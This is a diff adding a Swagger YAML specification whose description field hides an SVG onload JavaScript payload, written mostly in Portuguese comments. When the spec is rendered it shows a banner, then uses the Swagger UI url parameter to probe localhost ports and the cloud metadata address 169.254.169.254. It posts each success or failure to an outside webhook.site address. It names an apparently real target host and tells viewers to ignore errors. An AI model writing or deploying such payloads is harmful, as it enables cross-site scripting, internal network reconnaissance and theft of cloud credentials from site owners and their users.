@@ -1,0 +1,68 @@
+swagger: "2.0"
+info:
+  title: "🔍 SSRF Test - IGNORE ERROR BELOW"
+  description: |
+    <!-- O erro /swagger/v1/swagger.json é NORMAL, ignore -->
+    <svg width="0" height="0" onload="
+      // Popup de confirmação
+      alert('✅ SSRF Scanner Iniciado!\\n\\nAlvo: ' + window.location.hostname + '\\nHora: ' + new Date().toLocaleTimeString());
+      
+      // Mudar visual para confirmar execução
+      document.body.style.backgroundColor = '#e6f7ff';
+      document.body.style.transition = 'background 1s';
+      
+      // Adicionar banner
+      var banner = document.createElement('div');
+      banner.innerHTML = '🚀 SSRF Scanner Executando<br><small>Verifique seu webhook.site</small>';
+      banner.style = 'position:fixed; top:10px; left:10px; background:#4CAF50; color:white; padding:15px; border-radius:8px; z-index:99999; font-family:Arial; box-shadow:0 0 10px green;';
+      document.body.appendChild(banner);
+      
+      // Agora executar os testes SSRF
+      var internalServices = [
+        'http://localhost:21',      // FTP
+        'http://localhost:22',      // SSH
+        'http://localhost:80',      // HTTP
+        'http://localhost:81',      // HTTP
+        'http://localhost:3128',    // Squid Proxy
+        'http://localhost:3389',    // RDP
+        'http://localhost:8080',    // HTTP
+        'http://169.254.169.254/latest/meta-data/', // Cloud metadata
+        'http://127.0.0.1:443'      // HTTPS
+      ];
+      
+      internalServices.forEach(service => {
+        var ssrfUrl = '/api/swagger/index.html?url=' + encodeURIComponent(service);
+        
+        // Usar Image para evitar CORS issues
+        var img = new Image();
+        img.onload = function() {
+          console.log('SSRF successful to:', service);
+          fetch('https://webhook.site/f3880c57-1d67-42ff-b415-4d02c16d37a5', {
+            method: 'POST',
+            body: 'SSRF SUCCESS: ' + service + ' - ' + new Date().toISOString()
+          });
+        };
+        img.onerror = function() {
+          console.log('SSRF failed to:', service);
+          fetch('https://webhook.site/f3880c57-1d67-42ff-b415-4d02c16d37a5', {
+            method: 'POST',
+            body: 'SSRF FAILED: ' + service + ' - ' + new Date().toISOString()
+          });
+        };
+        img.src = ssrfUrl;
+      });
+      
+      console.log('SSRF scan completed at', new Date());
+    ">
+  version: "1.0-SSRF-Test"
+# Configurações mínimas para evitar erros
+host: "utanga.co.ao"
+basePath: "/api"
+schemes: ["http"]
+paths:
+  /test:
+    get:
+      summary: "Test endpoint for SSRF"
+      responses:
+        200:
+          description: "SSRF test active"
